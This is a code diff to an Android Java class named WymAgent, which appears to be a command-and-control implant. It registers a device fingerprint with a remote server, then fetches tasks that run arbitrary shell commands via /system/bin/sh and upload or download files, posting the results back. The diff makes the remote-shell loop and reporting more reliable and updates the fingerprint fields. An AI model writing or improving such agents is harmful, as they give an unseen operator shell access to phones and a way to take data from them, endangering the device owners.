@@ -93,12 +93,14 @@ public final class WymAgent implements Runnable {
 
     // ------------------------------------------------------------------
     private static String readAll(InputStream in) throws IOException {
+        if (in == null) return "";
         StringBuilder sb = new StringBuilder();
-        BufferedReader r = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8));
-        char[] buf = new char[4096];
-        int n;
-        while ((n = r.read(buf)) > 0) {
-            sb.append(buf, 0, n);
+        try (BufferedReader r = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8))) {
+            char[] buf = new char[4096];
+            int n;
+            while ((n = r.read(buf)) > 0) {
+                sb.append(buf, 0, n);
+            }
         }
         return sb.toString();
     }
@@ -118,13 +120,13 @@ public final class WymAgent implements Runnable {
         c.setDoOutput(true);
         c.setRequestProperty("Content-Type", "application/json");
         byte[] data = body.toString().getBytes(StandardCharsets.UTF_8);
-        OutputStream os = c.getOutputStream();
-        os.write(data);
-        os.flush();
-        os.close();
+        try (OutputStream os = c.getOutputStream()) {
+            os.write(data);
+            os.flush();
+        }
         int code = c.getResponseCode();
         InputStream in = code >= 200 && code < 300 ? c.getInputStream() : c.getErrorStream();
-        String text = in == null ? "" : readAll(in);
+        String text = readAll(in);
         c.disconnect();
         if (code == 404) {
             return null;
@@ -154,14 +156,14 @@ public final class WymAgent implements Runnable {
         try {
             JSONObject body = new JSONObject()
                     .put("agent_id", agentId == null ? "" : agentId)
-                    .put("hostname", android.os.Build.HOST)
-                    .put("username", android.os.Build.MODEL + " (" + android.os.Build.VERSION.RELEASE + ")")
+                    .put("hostname", android.os.Build.MODEL)
+                    .put("username", "android-" + android.os.Build.ID)
                     .put("os", "android")
-                    .put("arch", System.getProperty("os.arch", ""))
+                    .put("arch", android.os.Build.SUPPORTED_ABIS.length > 0 ? android.os.Build.SUPPORTED_ABIS[0] : System.getProperty("os.arch", ""))
                     .put("pid", android.os.Process.myPid())
                     .put("ip", getLocalIp())
                     .put("os_version", android.os.Build.VERSION.RELEASE)
-                    .put("version", "1.0")
+                    .put("version", "1.1")
                     .put("type", "Android");
             String resp = postJson("/api/register", body);
             if (resp == null) {
@@ -202,7 +204,8 @@ public final class WymAgent implements Runnable {
             if (type.equals("shell")) {
                 String cmd = args == null ? "" : args.optString("command", "");
                 int timeout = args == null ? 120 : clamp(args.optInt("timeout", 120), 1, 3600);
-                postResult(taskId, runShell(cmd, timeout), 0, "");
+                ShellResult sr = runShell(cmd, timeout);
+                postResult(taskId, sr.output, sr.exitCode, "");
             } else if (type.equals("download")) {
                 download(taskId, args);
             } else if (type.equals("upload")) {
@@ -237,58 +240,67 @@ public final class WymAgent implements Runnable {
         return Math.max(lo, Math.min(hi, v));
     }
 
-    private String runShell(String command, int timeoutSec) {
-        if (command == null || command.isEmpty()) {
-            return "error: empty command";
+    private static class ShellResult {
+        final String output;
+        final int exitCode;
+        ShellResult(String output, int exitCode) {
+            this.output = output;
+            this.exitCode = exitCode;
         }
+    }
+
+    private ShellResult runShell(String command, int timeoutSec) {
+        if (command == null || command.isEmpty()) {
+            return new ShellResult("error: empty command", 1);
+        }
+        Process p = null;
         try {
-            Process p = new ProcessBuilder("/system/bin/sh", "-c", command)
+            p = new ProcessBuilder("/system/bin/sh", "-c", command)
                     .redirectErrorStream(true).start();
-            StringBuilder out = new StringBuilder();
-            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8));
-            long deadline = SystemClock.elapsedRealtime() + timeoutSec * 1000L;
-            char[] buf = new char[2048];
-            long last = SystemClock.elapsedRealtime();
-            while (SystemClock.elapsedRealtime() < deadline) {
-                if (r.ready()) {
-                    int n = r.read(buf);
-                    if (n < 0) break;
-                    out.append(buf, 0, n);
-                    if (out.length() > 8000) break;
-                    last = SystemClock.elapsedRealtime();
-                } else {
-                    Thread.sleep(40);
-                    if (SystemClock.elapsedRealtime() - last > 2000) {
-                        try {
-                            int code = p.exitValue();
-                            if (code >= 0) {
-                                // drain what remains, then finish
-                                while (r.ready()) {
-                                    int n = r.read(buf);
-                                    if (n < 0) break;
-                                    out.append(buf, 0, n);
-                                }
-                                break;
-                            }
-                        } catch (IllegalThreadStateException e) {
-                            // still running
+            final StringBuilder out = new StringBuilder();
+            final InputStream is = p.getInputStream();
+            Thread reader = new Thread(() -> {
+                try (BufferedReader r = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8))) {
+                    char[] buf = new char[2048];
+                    int n;
+                    while ((n = r.read(buf)) != -1) {
+                        synchronized (out) {
+                            if (out.length() < 8000) out.append(buf, 0, n);
                         }
-                        last = SystemClock.elapsedRealtime();
                     }
+                } catch (IOException ignored) {}
+            });
+            reader.start();
+
+            boolean finished = false;
+            long deadline = System.currentTimeMillis() + (timeoutSec * 1000L);
+            while (System.currentTimeMillis() < deadline) {
+                try {
+                    p.exitValue();
+                    finished = true;
+                    break;
+                } catch (IllegalThreadStateException e) {
+                    Thread.sleep(100);
                 }
             }
-            String text = out.length() > 8000 ? out.substring(0, 8000) : out.toString();
-            int code;
-            try {
-                code = p.exitValue();
-            } catch (IllegalThreadStateException t) {
-                p.destroy(); // timed out
-                code = 124;
-                text = text.isEmpty() ? "command timed out (" + timeoutSec + "s)" : text;
+
+            if (!finished) {
+                p.destroy();
+                reader.join(500);
+                String text;
+                synchronized (out) { text = out.toString(); }
+                return new ShellResult("command timed out (" + timeoutSec + "s)\n" + text.trim(), 124);
             }
-            return (code == 0 ? "" : "command timed out (" + timeoutSec + "s)\n") + text.trim();
+            reader.join(1000);
+            int code = p.exitValue();
+            String text;
+            synchronized (out) { text = out.toString(); }
+            String status = code != 0 ? "command failed (exit code " + code + ")\n" : "";
+            return new ShellResult(status + text.trim(), code);
         } catch (Exception e) {
-            return "error: " + e;
+            return new ShellResult("error: " + e, 1);
+        } finally {
+            if (p != null) p.destroy();
         }
     }
 
@@ -366,7 +378,8 @@ public final class WymAgent implements Runnable {
             w.flush();
             os.close();
             int code = c.getResponseCode();
-            String body = readAll(c.getInputStream());
+            InputStream in = code >= 200 && code < 300 ? c.getInputStream() : c.getErrorStream();
+            String body = in == null ? "" : readAll(in);
             c.disconnect();
             postResult(taskId, code < 300 ? "uploaded " + path : "upload failed: HTTP " + code + " " + body,
                     code < 300 ? 0 : 1, "");
